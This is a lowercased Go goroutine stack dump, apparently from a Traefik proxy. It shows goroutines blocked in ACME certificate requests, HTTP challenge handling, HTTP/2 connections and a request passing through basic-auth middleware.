github.com/containous/traefik/vendor/k8s.io/client-go/rest/watch.(*decoder).decode( , , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/rest/watch/decoder.go:49 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch.(*streamwatcher).receive( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch/streamwatcher.go:93 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch.newstreamwatcher /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/watch/streamwatcher.go:60 + goroutine 103 [select]:
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getauthzfororder( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:597 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:389 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 117 [select, 1 minutes]:
github.com/containous/traefik/server.(*server).throttleproviderconfigreload.func1( ) /go/src/github.com/containous/traefik/server/server.go:415 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 64 [select]:
net/http.(*transport).getconn( , , , , , , , , , ) /usr/local/go/src/net/http/transport.go:962 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:409 +
net/http.send( , , , , , , , , , ) /usr/local/go/src/net/http/client.go:252 +
net/http.(*client).send( , , , , , , , , ) /usr/local/go/src/net/http/client.go:176 +
net/http.(*client).do( , , , , ) /usr/local/go/src/net/http/client.go:615 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.httppost( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:69 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*jws).post( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/jws.go:33 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.postjson( , , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:108 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).createorderforidentifiers( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:515 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:385 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 118 [select]:
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getauthzfororder( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:597 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:389 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 102 [runnable]:
github.com/containous/traefik/provider/acme.presenthttpchallenge( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/challenge.go:76 +
github.com/containous/traefik/provider/acme.(*provider).present( , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:331 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*httpchallenge).solve( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http_challenge.go:30 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).solvechallengeforauthz( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:543 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:398 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 151 [io wait, 1 minutes]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
crypto/tls.(*block).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:493 +
crypto/tls.(*conn).readrecord( , , , ) /usr/local/go/src/crypto/tls/conn.go:595 +
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1156 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:309 +
io.readfull( , , , , , , , ) /usr/local/go/src/io/io.go:327 +
net/http.http2readframeheader( , , , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1517 +
net/http.(*http2framer).readframe( , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1775 +
net/http.(*http2serverconn).readframes( ) /usr/local/go/src/net/http/h2_bundle.go:4392 +
created by net/http.(*http2serverconn).serve /usr/local/go/src/net/http/h2_bundle.go:4497 + goroutine 121 [runnable]:
github.com/containous/traefik/provider/acme.presenthttpchallenge( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/challenge.go:73 +
github.com/containous/traefik/provider/acme.(*provider).present( , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:331 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*httpchallenge).solve( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http_challenge.go:30 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).solvechallengeforauthz( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:543 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:398 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 145 [runnable]:
net/http.(*transport).getconn( , , , , , , , , , ) /usr/local/go/src/net/http/transport.go:962 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:409 +
net/http.send( , , , , , , , , , ) /usr/local/go/src/net/http/client.go:252 +
net/http.(*client).send( , , , , , , , , ) /usr/local/go/src/net/http/client.go:176 +
net/http.(*client).do( , , , , ) /usr/local/go/src/net/http/client.go:615 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.httppost( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:69 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*jws).post( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/jws.go:33 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.postjson( , , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:108 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).createorderforidentifiers( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:515 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:385 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 993 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 106 [io wait, 1 minutes]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 168 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
crypto/tls.(*block).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:493 +
crypto/tls.(*conn).readrecord( , , , ) /usr/local/go/src/crypto/tls/conn.go:595 +
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1156 +
io.readatleast( , , , , , , , , ) /usr/local/go/src/io/io.go:309 +
io.readfull( , , , , , , , ) /usr/local/go/src/io/io.go:327 +
net/http.http2readframeheader( , , , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1517 +
net/http.(*http2framer).readframe( , , , , ) /usr/local/go/src/net/http/h2_bundle.go:1775 +
net/http.(*http2serverconn).readframes( ) /usr/local/go/src/net/http/h2_bundle.go:4392 +
created by net/http.(*http2serverconn).serve /usr/local/go/src/net/http/h2_bundle.go:4497 + goroutine 133 [select]:
net/http.(*transport).getconn( , , , , , , , , , ) /usr/local/go/src/net/http/transport.go:962 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:409 +
net/http.send( , , , , , , , , , ) /usr/local/go/src/net/http/client.go:252 +
net/http.(*client).send( , , , , , , , , ) /usr/local/go/src/net/http/client.go:176 +
net/http.(*client).do( , , , , ) /usr/local/go/src/net/http/client.go:615 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.httppost( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:69 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*jws).post( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/jws.go:33 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.postjson( , , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:108 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).createorderforidentifiers( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:515 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:385 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 107 [select, 1 minutes]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 148 [select, 1 minutes]:
net/http.(*http2serverconn).serve( ) /usr/local/go/src/net/http/h2_bundle.go:4505 +
net/http.(*http2server).serveconn( , , , ) /usr/local/go/src/net/http/h2_bundle.go:4124 +
net/http.http2configureserver.func1( , , , ) /usr/local/go/src/net/http/h2_bundle.go:3962 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1751 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2795 + goroutine 136 [select]:
net/http.(*transport).getconn( , , , , , , , , , ) /usr/local/go/src/net/http/transport.go:962 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:409 +
net/http.send( , , , , , , , , , ) /usr/local/go/src/net/http/client.go:252 +
net/http.(*client).send( , , , , , , , , ) /usr/local/go/src/net/http/client.go:176 +
net/http.(*client).do( , , , , ) /usr/local/go/src/net/http/client.go:615 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.httppost( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:69 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*jws).post( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/jws.go:33 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.postjson( , , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:108 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).createorderforidentifiers( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:515 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:385 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 137 [select]:
net/http.(*transport).getconn( , , , , , , , , , ) /usr/local/go/src/net/http/transport.go:962 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:409 +
net/http.send( , , , , , , , , , ) /usr/local/go/src/net/http/client.go:252 +
net/http.(*client).send( , , , , , , , , ) /usr/local/go/src/net/http/client.go:176 +
net/http.(*client).do( , , , , ) /usr/local/go/src/net/http/client.go:615 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.httppost( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:69 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*jws).post( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/jws.go:33 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.postjson( , , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:108 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).createorderforidentifiers( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:515 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:385 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 996 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 139 [select]:
net/http.(*transport).getconn( , , , , , , , , , ) /usr/local/go/src/net/http/transport.go:962 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:409 +
net/http.send( , , , , , , , , , ) /usr/local/go/src/net/http/client.go:252 +
net/http.(*client).send( , , , , , , , , ) /usr/local/go/src/net/http/client.go:176 +
net/http.(*client).do( , , , , ) /usr/local/go/src/net/http/client.go:615 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.httppost( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:69 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*jws).post( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/jws.go:33 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.postjson( , , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:108 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).createorderforidentifiers( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:515 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:385 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 140 [select]:
net/http.(*transport).getconn( , , , , , , , , , ) /usr/local/go/src/net/http/transport.go:962 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:409 +
net/http.send( , , , , , , , , , ) /usr/local/go/src/net/http/client.go:252 +
net/http.(*client).send( , , , , , , , , ) /usr/local/go/src/net/http/client.go:176 +
net/http.(*client).do( , , , , ) /usr/local/go/src/net/http/client.go:615 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.httppost( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:69 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*jws).post( , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/jws.go:33 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.postjson( , , , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:108 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).createorderforidentifiers( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:515 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:385 +
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 +
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 245 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 173 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 174 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 165 [select]:
net/http.(*http2serverconn).serve( ) /usr/local/go/src/net/http/h2_bundle.go:4505 +
net/http.(*http2server).serveconn( , , , ) /usr/local/go/src/net/http/h2_bundle.go:4124 +
net/http.http2configureserver.func1( , , , ) /usr/local/go/src/net/http/h2_bundle.go:3962 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1751 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2795 + goroutine 1126 [select]:
net/http.(*persistconn).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:2033 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:422 +
github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.errorhandlingroundtripper.roundtrip( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:150 +
net/http/httputil.(*reverseproxy).servehttp( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:193 +
github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*httpforwarder).servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:493 +
github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*forwarder).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:263 +
github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin/rr.go:129 +
github.com/containous/traefik/middlewares.(*emptybackendhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/middlewares/empty_backend_handler.go:29 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1947 +
github.com/containous/traefik/middlewares/auth.createauthbasichandler.func1( , , , ) /go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:99 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
github.com/containous/traefik/middlewares/auth.(*authenticator).servehttp( , , , , ) /go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:138 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , ) /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1947 +
